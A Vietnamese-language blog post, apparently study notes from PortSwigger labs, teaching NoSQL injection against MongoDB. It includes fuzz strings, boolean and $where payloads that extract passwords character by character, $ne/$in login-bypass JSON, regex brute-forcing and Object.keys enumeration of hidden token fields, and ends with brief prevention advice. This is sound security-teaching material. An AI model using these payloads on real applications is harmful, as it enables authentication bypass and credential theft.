---
layout: post
title: "NoSQL injection"
render_with_liquid: false
categories:
  - Web Security
tags:
  - portswigger
  - nosql-injection
source_collection: notion_portswigger
---
## 1. NoSQL Injection là gì

NoSQL Injection là một lỗ hổng trong đó kẻ tấn công có thể can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu NoSQL. Việc tiêm NoSQL có thể cho phép kẻ tấn công:

- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

Không giống như SQL, NoSQL sử dụng nhiều ngôn ngữ truy vấn thay vì tiêu chuẩn chung như SQL và có ít ràng buộc quan hệ hơn.

## 2. Các kiểu NoSQL Injection

Có hai kiểu tiêm NoSQL khác nhau:

- `Syntax injection` : Điều này xảy ra khi có thể phá vỡ cú pháp truy vấn NoSQL, cho phép đưa tải trọng của riêng mình vào. Phương pháp này tương tự như phương pháp được sử dụng trong SQL Injection. Tuy nhiên, bản chất của cuộc tấn công rất khác nhau vì cơ sở dữ liệu NoSQL sử dụng nhiều ngôn ngữ truy vấn, loại cú pháp truy vấn và các cấu trúc dữ liệu khác nhau, mỗi loại sẽ có kiểu tiêm khác nhau có thể là ngôn ngữ truy vấn tùy chỉnh hoặc ngôn ngữ phổ biến như XML hoặc JSON.
- `Operator injection` : Điều này xảy ra khi có thể sử dụng toán tử truy vấn NoSQL để thao tác truy vấn.

## 3. **NoSQL syntax injection**

- **Detect NoSQL syntax injection**
    
    Để phát hiện các lỗ hổng chèn NoSQL bằng cách cố gắng phá vỡ cú pháp truy vấn. Để làm điều này kiểm tra một cách có hệ thống từng đầu vào bằng cách gửi các chuỗi fuzz và các ký tự đặc biệt của từng loại ngôn ngữ (XML hoặc JSON) gây ra lỗi cơ sở dữ liệu hoặc một số hành vi có thể phát hiện khác nếu chúng không được ứng dụng dọn dẹp hoặc lọc đầy đủ.
    
    - **Payload chung nhất để detect lỗi NoSQL syntax injection**
        
        ```python
        '"`{
        ;$Foo}
        $Foo \xYZ
        Lưu kết thúc sau \xYZ là null byte: %00 hoặc \u0000
        ```
        
        Nếu tham số cần Fuzzing nằm trên URL, cần EncodeURL:
        
        `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
        
        Nếu tham số cần Fuzzing nằm trong format JSON: `'\"`{\r;$Foo}\n$Foo \\xYZ\u0000`
        Payload này nhằm kiến ứng dụng bắn ra lỗi, từ đó để biết được bối cảnh và điều chỉnh lại payload sao cho phù hợp.
        
    - **Xác định ký tự nào được xử lý**
        
        Nhằm xác định những ký tự nào được ứng dụng hiểu là cú pháp, bằng cách gửi đi từng ký tự riêng lẻ như `'` `"` `{` `}`
        
        Có thể gửi `'` , dẫn đến truy vấn MongoDB sau: `this.category == '''`
        
        Nếu điều này gây ra thay đổi so với phản hồi ban đầu, điều này có thể cho thấy ký tự `'` đã phá vỡ cú pháp truy vấn và gây ra lỗi cú pháp.
        
        Xác nhận điều này bằng cách gửi chuỗi truy vấn hợp lệ trong đầu vào bằng cách `escaping the quote`: `this.category == '\''`
        
- **Exploit NoSQL syntax injection**
    - **Kiểm tra xem có thể chèn điều kiện Boolean không**
        
        Sau khi phát hiện lỗ hổng, bước tiếp theo là xác định xem có thể tác động đến các điều kiện `boolean` bằng cú pháp NoSQL hay không.
        
        Để kiểm tra điều này, hãy gửi hai yêu cầu, một yêu cầu có điều kiện sai và một yêu cầu có điều kiện đúng.
        
        - Điều kiện sai: `' && 0 && 'x`
        - Điều kiện đúng: `' && 1 && 'x`
        
        Nếu ứng dụng hoạt động khác đi, điều này cho thấy rằng điều kiện sai ảnh hưởng đến logic truy vấn, nhưng điều kiện đúng thì không. Nghĩa là việc đưa kiểu cú pháp này vào sẽ tác động đến truy vấn phía máy chủ.
        
    - **Ghi đè lên các điều kiện hiện có**
        
        Bây giờ đã xác định rằng có thể tác động đến các điều kiện boolean, cố gắng ghi đè các điều kiện hiện có để khai thác lỗ hổng.
        
        Có thể đưa vào một điều kiện JavaScript luôn đánh giá là đúng `'||1||'`:
        
        ```python
        https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
        ```
        
        Điều này dẫn đến truy vấn MongoDB sau:
        
        `this.category == 'fizzy'||'1'=='1'`
        
        Vì điều kiện được chèn luôn đúng nên truy vấn đã sửa đổi sẽ trả về tất cả các mục. Điều này cho phép xem tất cả các sản phẩm trong bất kỳ danh mục nào, bao gồm cả danh mục ẩn hoặc không xác định.
        
    - **Exploiting syntax injection to extract data**
        
        Trong nhiều cơ sở dữ liệu NoSQL, một số toán tử truy vấn hoặc hàm có thể chạy mã JavaScript, chẳng hạn như toán tử `$where` và hàm `mapReduce()` của MongoDB.
        
        Điều này có nghĩa là nếu một ứng dụng dễ bị tấn công sử dụng các toán tử hoặc hàm này thì cơ sở dữ liệu có thể thực thi JavaScript như một phần của truy vấn
        
        Hãy xem xét một ứng dụng dễ bị tấn công cho phép người dùng tra cứu tên người dùng đã đăng ký khác và hiển thị vai trò của họ. Điều này kích hoạt một yêu cầu tới URL:
        
        [`https://insecure-website.com/user/lookup?username=](https://insecure-website.com/user/lookup?username=admin)admin` 
        
        Query: 
        
        ```json
        db.users.find({ "$where": "this.username == 'admin'" });
        ```
        
        Vì truy vấn sử dụng toán tử `$where`, nên có thể thử đưa các hàm JavaScript vào truy vấn này để nó trả về dữ liệu nhạy cảm.
        
        Điều này trả về ký tự đầu tiên của chuỗi mật khẩu của người dùng, cho phép bạn trích xuất ký tự mật khẩu theo từng ký tự.
        
        ```jsx
        // admin' && this.password[0] == 'a' || 'a'=='b
        db.users.find({
         "$where": "this.username == 'admin' && this.password[0] == 'a' || 'a'=='b'" 
        });
        ```
        
        Có thể sử dụng hàm JavaScript `match()` để trích xuất thông tin. Ví dụ: tải trọng sau cho phép bạn xác định xem mật khẩu có chứa các chữ số hay không:
        
        ```jsx
        // admin' && this.password.match(/\d/) || 'a'=='b
        db.users.find({
         "$where": "this.username == 'admin' && this.password.match(/\d/) || 'a'=='b'" 
        });
        ```
        

## 4. **NoSQL operator injection**

Xảy ra khi sử dụng các toán tử truy vấn để chỉ định các điều kiện mà dữ liệu phải đáp ứng để được đưa vào kết quả truy vấn

- **Toán tử truy vấn MongoDB bao gồm:**
    - `$where` So khớp các tài liệu thỏa mãn biểu thức JavaScript.
    - `$ne` Khớp tất cả các giá trị không bằng với một giá trị được chỉ định.
    - `$in` Khớp tất cả các giá trị được chỉ định trong một mảng.
    - `$regex` Chọn tài liệu có giá trị khớp với biểu thức chính quy được chỉ định.
- **Detecting operator injection in MongoDB**
    
    Kiểm tra từng đầu vào với một loạt toán tử:
    
    ```json
    {
    	"username":"wiener",
    	"password":"peter"
    }
    ```
    
    Để kiểm tra xem thông tin nhập vào `username` có xử lý toán tử truy vấn hay không, bạn có thể thử thao tác chèn sau: 
    
    ```json
    {
    	"username":{
    		"$ne":"invalid"
    	},
    	"password":{
    		"peter"
    		}
    }
    ```
    
    Nếu toán tử `$ne` được áp dụng, điều này sẽ truy vấn tất cả người dùng có `username` không bằng với chuỗi `invalid`.
    
- **Exploit using operator injection  in MongoDB**
    - **Nếu cả thông tin nhập  `username` và `password` đều xử lý toán tử thì có thể bỏ qua xác thực bằng cách sử dụng trọng tải sau:**
        
        ```json
        {
        	"username":{
        		"$ne":"invalid"
        	},
        	"password":{
        		"$ne":"invalid"
        	}
        }
        ```
        
        Truy vấn này trả về tất cả thông tin đăng nhập trong đó cả  `username` và `password`  đều không bằng với chuỗi `invalid` . Kết quả là đã đăng nhập vào ứng dụng với tư cách là người dùng đầu tiên trong bộ sưu tập.
        
    - **Để nhắm mục tiêu vào một tài khoản, bạn có thể tạo trọng tải bao gồm tên người dùng đã biết hoặc tên người dùng mà bạn đã đoán**
        
        ```json
        {
        	"username":{
        		"$in":["admin","administrator","superadmin"]
        	},
        	"password":{
        		"$ne":""
        	}
        }
        ```
        
    - **Exploiting NoSQL operator injection to extract data**
        - **Exploit trên tham số**
            
            Từ việc detect lỗ hổng từ các tham số ở trên, ta có thể dùng `$regex` để brute-force từng ký tự của chuỗi
            
            ```jsx
            {
            	"username":"admin",
            	"password":{
            		"$regex":"^a"
            	}
            }
            ```
            
            `Giải thích:`  Tìm bản ghi có `username=admin`  và có `password`  thỏa mãn chuỗi regex ký tự đầu tiên của `password` là chữ `a` 
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled.png)
            
            Giả sử kết quả của brute-force là chữ `e` , ta thêm lại chữ `e` và tiếp tục brute-force 
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%201.png)
            
            Lặp lại cho đến khi hết chuỗi
            
            ```jsx
            {
            	"username":"carlos",
            	"password":{
            		"$regex":"^somethingfound§a§"
            	}
            }
            ```
            
        - **Kỹ thuật tìm các field ẩn và giá trị của field ẩn đó**
            
            Ngay cả khi truy vấn ban đầu không sử dụng bất kỳ toán tử nào cho phép chạy JavaScript tùy ý, vẫn có thể tự mình tiêm một trong những toán tử này. Sau đó, có thể sử dụng các điều kiện boolean để xác định xem ứng dụng có thực thi bất kỳ JavaScript nào mà bạn đưa vào thông qua toán tử này hay không.
            
            Các bước thực hiện phương pháp này như sau:
            
            `Bước 1` Check Error message
            
            Ví dụ: True ⇒ ‘Account locked’, False ⇒ ‘Invalid’
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%202.png)
            
            `Bước 2`   **Tìm các field (key) ẩn**
            
            field ẩn này có thể là các mã token, các secret của 1 user được dùng để tạo lại mật khẩu chẳng hạn
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%203.png)
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%204.png)
            
            `giải thích` 
            
            Object.keys() - Liệt kê tất cả các key của 1 đối tượng có định dạng JSON
            
            Object.keys(this) - Tham số `this` chính là đối tượng hiện tại đang xét
            
            Object.keys(this)[0] - Lấy ra key đầu tiên của Object (Trong mongodb, mọi đối tượng truy vấn đề phải có `_id`)
            
            Tăng dần vị trí của key từ 0, ta tìm được số key so sánh với số field trong request, ta sẽ xác định được liệu có field ẩn nào không
            
            `Bước 3`  **Tìm tên của field (Key) ẩn**
            
             Giải sử key bị ẩn ngoài `_id` `username` `password` nằm ở vị trí số 4 có index=3
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%205.png)
            
            Ta sử dụng regex như phần [**Exploit trên tham số](https://www.notion.so/NoSQL-Injection-078fcfc45b154f859b3d2b103157f905?pvs=21)** để lấy được từng ký tự
            
            Giả sử tìm được key ẩn là `unlockToken`  sang Bước 4 tiến hành lấy giá trị của `unlockToken` trong database 
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%206.png)
            
            `Bước 4` Extract giá trị của field ẩn trong DB
            
            Trước hết cần tìm độ dài của data 
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%207.png)
            
            Extract
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%208.png)
            
            ![Untitled](/assets/img/portswigger/nosql-injection/Untitled%209.png)
            
            Có thể Extract bằng chuỗi regex như ở trên.
            
- **Các phương thức gửi truy vấn**
    
    Trong JSON có thể chèn các toán tử truy vấn dưới dạng các đối tượng lồng nhau:
    
    `{"username":{"$ne":"invalid"}}`
    
    Đối với đầu vào dựa trên URL, có thể chèn toán tử truy vấn thông qua tham số URL. 
    
    `username=wiener`  ⇒  `username[$ne]=invalid`
    
    Nếu cách này không hiệu quả, có thể thử cách sau:
    
    1. Chuyển đổi phương thức yêu cầu từ `GET` sang `POST`.
    2. Thay đổi tiêu đề `Content-Type` thành `application/json`
    3. Thêm JSON payload vào boby
    
    `NOTE`: Có thể sử dụng [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) extension trong burpsuite để tự động chuyển đổi phương thức yêu cầu
    
    - JSON To XML
    - XML to JSON
    - Body parameters to JSON
    - Body parameters to XML

## Ngăn chặn việc tiêm NoSQL

- Dọn dẹp và xác thực thông tin đầu vào của người dùng bằng cách sử dụng while list gồm các ký tự được chấp nhận.
- Chèn thông tin đầu vào của người dùng bằng cách sử dụng các truy vấn được tham số hóa thay vì nối chuỗi trực tiếp thông tin đầu vào của người dùng vào truy vấn.
- Để ngăn chặn việc chèn toán tử, hãy áp dụng danh sách cho phép các khóa được chấp nhận.

## Tổng Kết

Detect **syntax injection:** 

- Thử chèn các ký tự `' " \ ; { }`  có thể nó sẽ gây ra lỗi cơ sở dữ liệu.
- Tùy thuộc vào bối cảnh: `&& '1'=='2` `|| '1'=='1` `'||1||’`
- `'` ⇒ Lỗi; `\'` ⇒ không lỗi

Detect **operator injection:** 

- `$where` So khớp các tài liệu thỏa mãn biểu thức JavaScript.
- `$ne` Khớp tất cả các giá trị không bằng với một giá trị được chỉ định.
- `$in` Khớp tất cả các giá trị được chỉ định trong một mảng.
- `$regex` Chọn tài liệu có giá trị khớp với biểu thức chính quy được chỉ định.
- Thử chèn các toán tử `$where` `$ne` `$in` `$regex` vào các parameter:
    
    ```jsx
    Content-Type: application/json
    {
    	"username":{
    		"$ne":"invalid"
    	},
    	"password":{
    		"peter"
    		}
    }
    Hoặc
    Content-Type: application/x-www-form-urlencoded
    username[$ne]=invalid&&password=peter
    ```
    
- Thử chèn thêm các toán tử `$where` `$ne` `$in` `$regex` như 1 key mới của Object:
    
    ```jsx
    {
    	"username":"carlos",
    	"password":{
    		"$ne":""
    	},
    	"$where":"0"
    }
    // "$where":"0" => lỗi || "$where":"1" => Không lỗi
    ```
    

Sử dụng `Object.keys(this)` để extract các field của đối tượng `this` có trong database

Sử dụng `Object.keys(this)[index]` để extract 1 field của đối tượng `this` có trong database

Sử dụng `this.fieldName`  đế extract giá trị của 1 field tìm được
